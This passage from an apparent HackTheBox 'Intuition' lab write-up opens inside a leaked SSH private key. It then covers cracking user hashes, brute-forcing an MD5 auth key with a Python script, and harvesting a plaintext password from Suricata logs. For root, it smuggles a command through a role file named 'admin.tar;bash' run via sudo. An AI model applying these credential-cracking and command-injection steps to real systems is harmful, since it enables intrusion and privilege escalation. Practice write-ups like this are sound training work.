XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4
AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA
rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N
KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P
bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI
9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl
nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW
ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
XxwXArPr6+HQe9hZSjI2hjYC2OU=
-----END OPENSSH PRIVATE KEY-----


```

* We can use the key-phrase and this key with `SSH-KEYGEN` to generate a key to SSH into the machine for our true foothold.

## <i class="fa-solid fa-desktop" style="color: #b197fc;"></i> SSH Key:
* Now save the key to a file `id_rsaIntuition`.

<img src="/images/box-images/Intuition/Intuition_SSH_Key_Gen.png">

* Then we want to decrypt the key with the old key and overwrite the passphrase. I left it blank for no password.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `ssh-keygen -p -f id_rsaIntuition`<br>
* **Username:**` dev_acc@local` - A note is left on the key that mentions `dev_acc@local`.<br>
	<i class="fa-solid fa-explosion" style="color: #aec07c;"></i> `chmod 600` on `id_rsa` to change file permissions for use in ssh.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `ssh -i id_rsa dev_acc@comprezzor.htb`

<img src="/images/box-images/Intuition/Intuition_Dev_Acc_SSH_USER_PWN.png">

## <i class="fa-solid fa-feather-pointed" style="color: #aec07c;"></i> Recon:
* **Quick checks**
	* Current Directory <mark>~/dev_acc/</mark>
	* Need password for Sudo -l access

### Directory Enumeration
* Lets check the <mark>`var/www/app`</mark> directory where the `.py` files are located that we where abusing for `lfi` earlier.
* Theres a `.db` located under <mark>`/var/www/app/blueprints/auth`</mark> that looks like its dedicated to the users.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `users.db`
* Cat out the `users.db` file and we find some hashes.

```
tablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user'
=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin

```

* `sqlite` is installed on the box lets open the `users.db`.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `sqlite users.db`<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `Select * from users;`

<img src="/images/box-images/Intuition/Intuition_Usersdb_hashes.png">

* We dump two hashes for `admin` and `adam`.

```
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev

```

* Dumping `adams` hash we can crack it with hashcat.<br>
	<i class="fa-solid fa-explosion" style="color: #aec07c;"></i> `hashcat -m 1460 -a 0 hash1 /usr/share/wordlists/rockyou.txt `<br>
	<i class="fa-solid fa-seedling fa-lg" style="color: #98971a"></i>  `a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:Z7bcBO9P43gvdQWp:adam gray`

* We can connect to `FTP` with our foothold on the machine using `adam : adam gray` account/creds.

<img src="/images/box-images/Intuition/Intuition_Adam_FTP.png">

* Inspecting the directories we find a backup of an application called `runner1`.

<img src="/images/box-images/Intuition/Intuition_Runner1_FTP_Backup.png">

* `get` all three files from the ftp server.

* Catting out the `run-tests.sh` script we see that it appears to be a script that runs an `ansible playbook` to install roles.

```
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

* This will probably be our attack path. But right now with `dev_acc` Im not seeing any possible way to exploit this at the moment.

* Catting out `runner1.c` or Reverse Engineering the `runner` app with ghidra we can see that there is a `check_auth` function  crafted in the app which checks the provided `auth_key` from the script to ensure the hashes match before running the playbook.

<img src="/images/box-images/Intuition/Intuition_Reverse_Auth_Key.png">

{%highlight python%}
#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}
{%endhighlight%}

* Valid Hash: `0feda17076d793c2ef2870d7427ad4ed`

* Knowing the required `hash` value and having half of the `auth_key="UHI75GHI****"` we can attempt to brute-force out the password.

## Auth Key Brute-force:
* Below is a python script that will check random strings until we get a match of hash values then print out the password that created the matching hash value.

{%highlight python%}
import hashlib
from itertools import product
import string

# Define the partial string and target hash
partial_string = "UHI75GHI"
target_hash = "0feda17076d793c2ef2870d7427ad4ed"

# Define the length and characters for the missing part
missing_length = 4
characters = string.ascii_uppercase + string.digits  # Adjust as needed

# Function to compute MD5 hash
def md5_hash(s):
    return hashlib.md5(s.encode()).hexdigest()

# Brute-force to find the complete string
for combination in product(characters, repeat=missing_length):
    guess = partial_string + ''.join(combination)
    if md5_hash(guess) == target_hash:
        print(f"Found match: {guess}")
        break
else:
    print("No match found.")
{%endhighlight%}

* Running this script generates the full `auth_key` for us.<br>
	<i class="fa-solid fa-seedling fa-lg" style="color: #98971a"></i>  `UHI75GHINKOP`

* You can also achieve this same technique with `hashcat`.<br>
	<i class="fa-solid fa-explosion" style="color: #aec07c;"></i> `hashcat -a 3 -m 0 -1 ?u?d 0feda17076d793c2ef2870d7427ad4ed UHI75GHI?1?1?1?1`

<img src="/images/box-images/Intuition/Intuition_Hashcat_Auth_Key.png">

## <i class="fa-solid fa-person-walking-arrow-loop-left" style="color: #fb4934;"></i> Lateral Escalation:
*  Checking under <mark>`/var/logs/suricata`</mark> we find a lot of `.gz` compressed log files.<br>
<i class="fa-solid fa-star" style="color: #fabd2f;"></i> `Suricata` is a threat detection and Analysis system that monitors network activity. Any network activity will have been logged into these files.

<img src="/images/box-images/Intuition/Intuition_Suricata_Logs.png">

* Lets grep across all these `.gz` logs and see if we can find any interesting information.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> using `zgrep -i password /var/log/suricata/*.gz` to search .gz files<br>
	* We get a ton of information with `password`. But maybe theres a way to cut most of this out.

* Checking `/home` we have a user named `lopez` that has logged into this machine. Lets change our grep to look for `lopez`.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `zgrep -i lopez /var/log/suricata/*.gz`

* We get a more manageable output this time.

```
dev_acc@intuition:/var/log/suricata$ zgrep -i lopez  /var/log/suricata/*.gz   
/var/log/suricata/eve.json.8.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
/var/log/suricata/eve.json.8.gz:{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezzz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
/var/log/suricata/eve.json.8.gz:{"timestamp":"2023-09-28T17:44:32.133372+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
/var/log/suricata/eve.json.8.gz:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}
```


## Lopez Login:
* Checking the logs we can see that `lopez` password was recorded in plain text.<br>
	<i class="fa-solid fa-seedling fa-lg" style="color: #98971a"></i>  password: `Lopezz1992%123`

## <i class="fa-solid fa-feather-pointed" style="color: #aec07c;"></i> Recon:
* Checking `sudo -l` for `lopez` we see that they can run the app `runner2` with escalated permissions. 

```
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
    
```

* `lopez` is also apart of `sys-adm` group.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `id lopez`

```
uid=1003(lopez) gid=1003(lopez) groups=1003(lopez),1004(sys-adm)

```

## CVE-2023-5115:
* Looking for a `CVE` related to ansible roles we find a relatively recent CVE exploiting path traversal within a playbook that allows us to change the symlink to overwrite a file outside the extraction path.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-5115">https://nvd.nist.gov/vuln/detail/CVE-2023-5115</a><br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://security.snyk.io/vuln/SNYK-PYTHON-ANSIBLE-5917149">https://security.snyk.io/vuln/SNYK-PYTHON-ANSIBLE-5917149</a>

* Arbitrary files the user has access to can be overwritten. The malicious role must contain a symlink with an absolute path to the target file, followed by a file of the same name (as the symlink) with the contents to write to the target.
* Basically we need to create a role with the `path/cmd` we want to exploit in the role and also the NAME of the `.tar` file we are using to exploit the role in the `role_file` key of ansible script.

* Another note to make is that `ansible-galaxy` will check for valid compression before loading the file so we must use a known valid format to craft our payload.

* Looking around we find this `Sys admins Role` playbook we can take advantage of.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://github.com/coopdevs/sys-admins-role/">https://github.com/coopdevs/sys-admins-role/</a><br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz">https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz</a>

# Ansible Role Injection:
* Now that we have a valid compressed file we need to create our `ansible structured json file`.

```
nano root.json
```

* We need to paste the following information into the json file.
    * The `action` to take when running the playbook. `install` which will install the role.
    * The File name and command to run when loaded.
    * `admin.tar.gz;bash` - This will give us a root bash shell when ran.
    * and the `auth_code` we found earlier in the ``

```
{  
        "run":{  
                "action":"install",  
                "role_file":"admin.tar;bash"  
        },  
        "auth_code":"UHI75GHINKOP"  
}

```

* Download the `.tar` file from the github archive.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `wget https://github.com/coopdevs/ansible-role-template/archive/refs/tags/v1.0.0.tar.gz`
* Then rename it to make the `role_file` path name.
	* `mv v0.0.3.tar admin.tar.gz`
	* Unzip to get the `.tar` file.
	* `gunzip -d admin.tar.gz`

# Root Elevation:
* Now upload the two files to `lopez` home directory.
```
scp admin.tar lopez@comprezzor.htb:/home/lopez/
```
```
scp root.json lopez@comprezzor.htb:/home/lopez/
```
* Now lets elevate our current shell to root with the injected role.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> We need to rename the file once on the victim to match the file path in the `json` to get the command injection.
```
cp admin.tar "admin.tar;bash"
```

* Then we can run the app with the `root.json` playbook to get our `root bash shell`
```
sudo /opt/runner2/runner2 root.json
```

<img src="/images/box-images/Intuition/Intuition_Root_Runner_Exploit.png">

* Now we can cat out the root flag.

<img src="/images/box-images/Intuition/Intuition_Root_Shell.png">

# Rooted:
<i class="fa-solid fa-star" style="color: #fabd2f;"></i> We have direct access to a  shell with root access in the management console.<br>
```
cat /root/root.txt
```
* RootText: 148a0b3e5da26e722b121a64353372e1